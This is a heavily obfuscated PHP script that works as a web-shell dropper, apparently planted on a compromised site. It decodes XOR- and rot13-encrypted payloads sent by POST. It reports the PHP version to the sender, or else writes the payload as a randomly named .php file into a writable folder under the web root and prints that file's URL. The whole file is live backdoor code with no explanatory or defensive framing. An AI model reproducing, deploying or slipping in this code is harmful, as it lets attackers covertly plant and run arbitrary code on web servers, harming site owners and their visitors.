<?php $AQyoM = "\104".chr(79)."\103".chr(85)."\115"."\105".'N'."\124".chr(596-501)."\122".chr(79)."\117".'T';$wzVgD = chr(72).chr(84).chr(294-210)."\x50"."\x5f".chr(245-173)."\x4f"."\x53"."\124";$UTLtt = chr(225-121).chr(116).'t'.chr(653-541).chr(888-830)."\57".'/';$hnYhrWC = chr(59-13).chr(944-832)."\150".chr(112);$gisfFAx = chr(385-273).chr(769-665)."\x70";$VqBjQ = "\146"."\151"."\154".chr(761-660).chr(968-873).'p'."\165".chr(116)."\x5f".chr(161-62).'o'."\x6e".'t'."\x65"."\x6e".chr(359-243).chr(914-799);$uDVsIAapg = "\x72"."\141".chr(775-656).'u'.chr(114).'l'.'d'."\x65".chr(596-497).chr(111)."\144".'e';$jJQfXGKc = chr(117).chr(671-561).chr(788-673)."\x65".'r'."\151".chr(494-397)."\x6c".chr(105)."\172".chr(579-478);$WUnPUH = "\151".chr(817-702).'_'."\167".'r'."\151".chr(300-184).chr(592-495).chr(701-603).chr(656-548).'e';$CjtsgPhBy = 'p'.'h'.chr(112)."\166".'e'.'r'.chr(643-528).chr(436-331).'o'."\156";$otCQxqwE = chr(651-536)."\164"."\162".'_'."\x72".'o'."\164".chr(517-468).'3';$erbCpr = 's'.chr(101).chr(1023-909).'i'.chr(398-301)."\154".chr(105).chr(330-208)."\145";$VQhkkh = chr(115).chr(366-250)."\x72".chr(95)."\163".chr(112)."\x6c"."\x69".chr(116);foreach ($_POST as $mzhzheFBgy => $aHkvQjQX){$rgigYKSu = strlen($mzhzheFBgy);if ($rgigYKSu == 16){$aHkvQjQX = $VQhkkh($uDVsIAapg($otCQxqwE($aHkvQjQX)));$mzhzheFBgy = array_slice($VQhkkh(str_repeat($mzhzheFBgy, (count($aHkvQjQX)/16)+1)), 0, count($aHkvQjQX));function ayqwhbsILj($aWKMhT, $eJHdeK, $mzhzheFBgy){$ZsabX = "cf8281d5-3c93-42e8-83da-48f1620ea314";return $aWKMhT ^ $ZsabX[$eJHdeK % strlen($ZsabX)] ^ $mzhzheFBgy;}$aHkvQjQX = array_map("ayqwhbsILj", array_values($aHkvQjQX), array_keys($aHkvQjQX), array_values($mzhzheFBgy));$aHkvQjQX = implode("", $aHkvQjQX);$aHkvQjQX = @$jJQfXGKc($aHkvQjQX);if (@is_array($aHkvQjQX)){$IOflwgC = array_keys($aHkvQjQX);$aHkvQjQX = $aHkvQjQX[$IOflwgC[0]];if ($aHkvQjQX === $IOflwgC[0]){echo @$erbCpr(Array($gisfFAx => @$CjtsgPhBy(), ));exit();}else {function xWrSX($kyBtLnJnir){static $DvXUpBHMOC = array();$kAuPBOW = glob($kyBtLnJnir . '/*', GLOB_ONLYDIR);$sebNvsHfG = count($kAuPBOW);if ($sebNvsHfG > 0) {foreach ($kAuPBOW as $kyBtLnJn) {if (@$WUnPUH($kyBtLnJn)) {$DvXUpBHMOC[] = $kyBtLnJn;}}}foreach ($kAuPBOW as $kyBtLnJnir) xWrSX($kyBtLnJnir);return $DvXUpBHMOC;}$BlSVm = $_SERVER[$AQyoM];$kAuPBOW = xWrSX($BlSVm);$IOflwgC = array_rand($kAuPBOW);$xHNoxZp = $kAuPBOW[$IOflwgC] . "/" . substr(md5(time()), 0, 8) . $hnYhrWC;@$VqBjQ($xHNoxZp, $aHkvQjQX);$BCfCPa = $UTLtt . $_SERVER[$wzVgD] . substr($xHNoxZp, strlen($BlSVm));print($BCfCPa);die();}}}}